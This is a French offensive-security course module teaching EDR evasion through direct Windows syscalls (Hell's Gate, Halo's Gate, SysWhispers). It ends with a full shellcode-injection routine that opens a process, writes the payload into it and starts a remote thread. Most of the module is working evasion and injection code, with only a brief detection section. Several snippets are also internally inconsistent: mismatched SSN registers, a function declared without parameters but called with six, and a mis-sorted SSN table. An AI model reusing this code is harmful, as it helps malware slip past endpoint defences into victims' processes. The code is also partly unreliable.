# Module W35 : Syscall Evasion - Direct Syscalls et Hell's Gate

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre l'architecture des syscalls Windows
- Implémenter des syscalls directs pour bypasser les hooks EDR
- Utiliser Hell's Gate pour résoudre dynamiquement les SSN
- Maîtriser Halo's Gate et SysWhispers comme alternatives

## 1. Architecture des Syscalls Windows

### 1.1 Flux normal d'un appel système

```
Application
    │
    ├─► kernel32.dll!VirtualAlloc
    │         │
    │         └─► ntdll.dll!NtAllocateVirtualMemory  ◄─ Potentiellement hooké!
    │                   │
    │                   ├─ mov r10, rcx
    │                   ├─ mov eax, 0x18  ◄──────────── SSN (System Service Number)
    │                   ├─ syscall        ◄──────────── Transition vers kernel
    │                   └─ ret
    │                         │
    │                         └─► ntoskrnl.exe (kernel)
    │                                   │
    │                                   └─► Exécution de la fonction kernel
```

**SSN (System Service Number)** : Identifiant unique de la fonction kernel.

### 1.2 Pourquoi les syscalls directs ?

**Problème avec les API classiques** :
```
EDR Hook sur ntdll.dll
┌────────────────────────────────┐
│ NtAllocateVirtualMemory:       │
│   jmp EDR_Handler  ◄───────────┼─ HOOK! Tout passe par l'EDR
│   ...                          │
└────────────────────────────────┘

Solution : Syscall Direct
┌────────────────────────────────┐
│ Notre code:                    │
│   mov r10, rcx                 │
│   mov eax, 0x18  ◄─────────────┼─ SSN récupéré dynamiquement
│   syscall        ◄─────────────┼─ Appel direct au kernel
│   ret                          │
└────────────────────────────────┘
    │
    └─► Bypass total de l'EDR userland!
```

## 2. Hell's Gate - Résolution Dynamique des SSN

### 2.1 Principe

**Hell's Gate** : Technique pour extraire le SSN directement depuis ntdll.dll en mémoire.

**Schéma** :
```
ntdll.dll en mémoire
┌────────────────────────────────────┐
│ NtAllocateVirtualMemory:           │
│   0x00: 4C 8B D1    mov r10, rcx   │
│   0x03: B8 18 00 00 00    mov eax, 0x18  ◄─ SSN = 0x18
│   0x08: 0F 05       syscall        │
│   0x0A: C3          ret            │
└────────────────────────────────────┘

Hell's Gate va :
1. Trouver l'adresse de NtAllocateVirtualMemory
2. Lire les octets à l'offset 0x04
3. Extraire le SSN (0x18)
4. L'utiliser pour faire un syscall direct
```

### 2.2 Implémentation Hell's Gate

```c
#include <windows.h>
#include <stdio.h>

// Structure pour stocker les informations syscall
typedef struct _SYSCALL_INFO {
    DWORD ssn;          // System Service Number
    PVOID syscallAddr;  // Adresse de l'instruction syscall
} SYSCALL_INFO, *PSYSCALL_INFO;

// Recherche le SSN et l'adresse syscall d'une fonction ntdll
BOOL HellsGate(LPCSTR functionName, PSYSCALL_INFO pSyscallInfo) {
    // 1. Obtenir l'adresse de la fonction
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Erreur GetModuleHandle(ntdll)\n");
        return FALSE;
    }

    PVOID pFunction = GetProcAddress(hNtdll, functionName);
    if (!pFunction) {
        printf("[-] Erreur GetProcAddress(%s)\n", functionName);
        return FALSE;
    }

    printf("[+] %s à: 0x%p\n", functionName, pFunction);

    // 2. Parser les opcodes pour extraire le SSN
    BYTE* pCode = (BYTE*)pFunction;

    // Pattern attendu (x64) :
    // 4C 8B D1          mov r10, rcx
    // B8 XX XX XX XX    mov eax, SSN
    // 0F 05             syscall
    // C3                ret

    // Vérifier le pattern "mov r10, rcx"
    if (pCode[0] != 0x4C || pCode[1] != 0x8B || pCode[2] != 0xD1) {
        printf("[-] Pattern 'mov r10, rcx' non trouvé (potentiellement hooké)\n");
        return FALSE;
    }

    // Vérifier "mov eax, XXX"
    if (pCode[3] != 0xB8) {
        printf("[-] Pattern 'mov eax' non trouvé\n");
        return FALSE;
    }

    // Extraire le SSN (4 octets après 0xB8)
    pSyscallInfo->ssn = *(DWORD*)(pCode + 4);

    // Trouver l'adresse de l'instruction "syscall" (0x0F 0x05)
    for (int i = 0; i < 32; i++) {
        if (pCode[i] == 0x0F && pCode[i + 1] == 0x05) {
            pSyscallInfo->syscallAddr = (PVOID)(pCode + i);
            printf("[+] SSN: 0x%02X, Syscall à: 0x%p\n",
                   pSyscallInfo->ssn, pSyscallInfo->syscallAddr);
            return TRUE;
        }
    }

    printf("[-] Instruction 'syscall' non trouvée\n");
    return FALSE;
}

// Exemple : Effectuer un syscall direct pour NtAllocateVirtualMemory
extern NTSTATUS SyscallStub(
    DWORD ssn,
    PVOID arg1,
    PVOID arg2,
    PVOID arg3,
    PVOID arg4,
    PVOID arg5,
    PVOID arg6,
    PVOID arg7,
    PVOID arg8,
    PVOID arg9,
    PVOID arg10
);

// Stub assembleur (à placer dans un fichier .asm séparé)
/*
.code
SyscallStub PROC
    mov r10, rcx            ; 1er argument
    mov eax, ecx            ; SSN (passé en 1er argument)
    syscall                 ; Appel direct au kernel
    ret
SyscallStub ENDP
END
*/

// Version inline (x64 uniquement, nécessite /SAFESEH:NO)
__declspec(naked) NTSTATUS DirectSyscall() {
    __asm {
        mov r10, rcx
        mov eax, dword ptr [SyscallInfo.ssn]
        syscall
        ret
    }
}

// Structure globale pour stocker le SSN
SYSCALL_INFO SyscallInfo = { 0 };

NTSTATUS MyNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // Configuration du SSN
    if (SyscallInfo.ssn == 0) {
        if (!HellsGate("NtAllocateVirtualMemory", &SyscallInfo)) {
            return -1;
        }
    }

    // Préparation des arguments selon la convention d'appel x64
    // RCX, RDX, R8, R9, puis stack pour les suivants

    // Appel du syscall direct
    return DirectSyscall(
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        RegionSize,
        AllocationType,
        Protect
    );
}
```

### 2.3 Fichier ASM pour le stub syscall (syscall.asm)

```asm
.code

; Prototype:
; NTSTATUS SyscallStub(DWORD ssn, ...)
SyscallStub PROC
    mov r10, rcx        ; Windows x64 calling convention : 1er arg (ProcessHandle)
    mov eax, edx        ; 2ème arg = SSN
    syscall             ; Transition vers le kernel
    ret
SyscallStub ENDP

; Stub générique avec SSN en argument
DirectSyscall PROC
    mov r10, rcx
    mov eax, edx        ; SSN passé en 2ème argument
    syscall
    ret
DirectSyscall ENDP

END
```

## 3. Halo's Gate - Gestion des Hooks

### 3.1 Problème avec Hell's Gate

**Si la fonction est hookée** :
```
NtAllocateVirtualMemory (HOOKÉ):
  0x00: E9 XX XX XX XX    jmp EDR_Handler  ◄─ HOOK! Plus de pattern valide
  0x05: ...               [octets écrasés]
```

**Solution : Halo's Gate** cherche dans les fonctions voisines pour estimer le SSN.

### 3.2 Principe de Halo's Gate

```
Fonctions ntdll triées par SSN:
┌────────────────────────────────┐
│ NtAccessCheck: SSN = 0x00      │
│ NtAllocateVirtualMemory: 0x18  │ ◄─ Cible (HOOKÉ)
│ NtClose: SSN = 0x0F            │
│ NtCreateFile: SSN = 0x55       │
└────────────────────────────────┘

Halo's Gate :
1. Détecte que NtAllocateVirtualMemory est hooké
2. Regarde la fonction AVANT (down)
3. Trouve NtClose avec SSN = 0x0F
4. Calcule: NtAllocateVirtualMemory ≈ 0x0F + distance
```

### 3.3 Implémentation Halo's Gate

```c
// Récupère le SSN d'une fonction voisine
BOOL HalosGate(LPCSTR functionName, PSYSCALL_INFO pSyscallInfo) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pFunction = GetProcAddress(hNtdll, functionName);
    BYTE* pCode = (BYTE*)pFunction;

    // Vérifier si la fonction est hookée
    if (pCode[0] == 0xE9 || pCode[0] == 0xE8) {  // jmp ou call
        printf("[!] %s est hooké, utilisation de Halo's Gate\n", functionName);

        // Chercher dans les fonctions voisines
        // On va scanner vers le bas et le haut de la mémoire

        DWORD ssnFound = 0;
        BOOL found = FALSE;

        // Scan DOWN (adresses inférieures)
        for (int offset = -32; offset <= 32; offset += 1) {
            if (offset == 0) continue;  // Skip la fonction hookée

            BYTE* neighbor = pCode + (offset * 32);  // Espacement moyen entre fonctions

            // Vérifier le pattern
            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
                neighbor[3] == 0xB8) {
                ssnFound = *(DWORD*)(neighbor + 4);
                printf("[+] SSN trouvé dans fonction voisine (offset %d): 0x%02X\n",
                       offset, ssnFound);

                // Estimer le SSN de notre fonction
                pSyscallInfo->ssn = ssnFound - offset;
                found = TRUE;
                break;
            }
        }

        if (!found) {
            printf("[-] Impossible de trouver un SSN valide\n");
            return FALSE;
        }

        // Trouver une instruction syscall valide (dans n'importe quelle fonction Nt*)
        PVOID anySyscall = NULL;
        for (int offset = -512; offset <= 512; offset++) {
            if (pCode[offset] == 0x0F && pCode[offset + 1] == 0x05) {
                anySyscall = pCode + offset;
                break;
            }
        }

        pSyscallInfo->syscallAddr = anySyscall;
        printf("[+] SSN estimé: 0x%02X, Syscall à: 0x%p\n",
               pSyscallInfo->ssn, pSyscallInfo->syscallAddr);
        return TRUE;
    }

    // Si non hooké, utiliser Hell's Gate classique
    return HellsGate(functionName, pSyscallInfo);
}
```

## 4. SysWhispers - Génération Automatique

### 4.1 Présentation

**SysWhispers** : Outil qui génère automatiquement des stubs ASM pour syscalls directs.

**Avantages** :
- Pas besoin de résolution dynamique
- SSN hardcodés (par version Windows)
- Code ASM optimisé

**Utilisation** :
```bash
# Générer les stubs pour certaines fonctions
python syswhispers.py -f NtAllocateVirtualMemory,NtCreateThreadEx -o syscalls

# Produit :
#   syscalls.h      (prototypes C)
#   syscalls.c      (wrappers)
#   syscalls.asm    (stubs syscall)
```

### 4.2 Exemple de code généré

```c
// syscalls.h
NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// syscalls.asm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h        ; SSN hardcodé pour Windows 10
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

## 5. Applications Offensives

### 5.1 Injection via Syscalls Directs

```c
#include "syscalls.h"  // Généré par SysWhispers

BOOL InjectShellcodeViaSyscalls(DWORD pid, PVOID shellcode, SIZE_T size) {
    // 1. Ouvrir le processus
    OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
    CLIENT_ID clientId = { (HANDLE)pid, NULL };
    HANDLE hProcess = NULL;

    NTSTATUS status = NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &clientId
    );

    if (status != 0) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return FALSE;
    }

    // 2. Allouer de la mémoire
    PVOID remoteBuffer = NULL;
    SIZE_T allocSize = size;

    status = NtAllocateVirtualMemory(
        hProcess,
        &remoteBuffer,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        NtClose(hProcess);
        return FALSE;
    }

    printf("[+] Mémoire allouée à: 0x%p\n", remoteBuffer);

    // 3. Écrire le shellcode
    status = NtWriteVirtualMemory(
        hProcess,
        remoteBuffer,
        shellcode,
        size,
        NULL
    );

    if (status != 0) {
        printf("[-] NtWriteVirtualMemory failed: 0x%08X\n", status);
        NtFreeVirtualMemory(hProcess, &remoteBuffer, &allocSize, MEM_RELEASE);
        NtClose(hProcess);
        return FALSE;
    }

    // 4. Changer les permissions en RX
    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        hProcess,
        &remoteBuffer,
        &allocSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    // 5. Créer un thread
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remoteBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("[-] NtCreateThreadEx failed: 0x%08X\n", status);
        NtFreeVirtualMemory(hProcess, &remoteBuffer, &allocSize, MEM_RELEASE);
        NtClose(hProcess);
        return FALSE;
    }

    printf("[+] Thread créé avec succès!\n");
    NtClose(hThread);
    NtClose(hProcess);
    return TRUE;
}
```

## 6. Détection et Mitigations

**IOCs** :
- Appels syscall depuis des régions non-ntdll (détectable via ETW)
- Absence de stack frame ntdll dans les call stacks
- Patterns de syscalls inhabituels

**Mitigations EDR** :
- Kernel callbacks (PsSetCreateProcessNotifyRoutine)
- ETW (Event Tracing for Windows)
- Instrumentation au niveau kernel

## 7. Checklist de maîtrise

- [ ] Je comprends l'architecture des syscalls Windows
- [ ] Je sais extraire un SSN avec Hell's Gate
- [ ] Je maîtrise Halo's Gate pour les fonctions hookées
- [ ] Je peux utiliser SysWhispers
- [ ] Je connais les limitations des syscalls directs

## Exercices

Voir [exercice.md](exercice.md)

---

**Navigation**
- [Module précédent : API Hashing](../02-API-Hashing/)
- [Module suivant : AMSI Bypass](../04-AMSI-Bypass/)
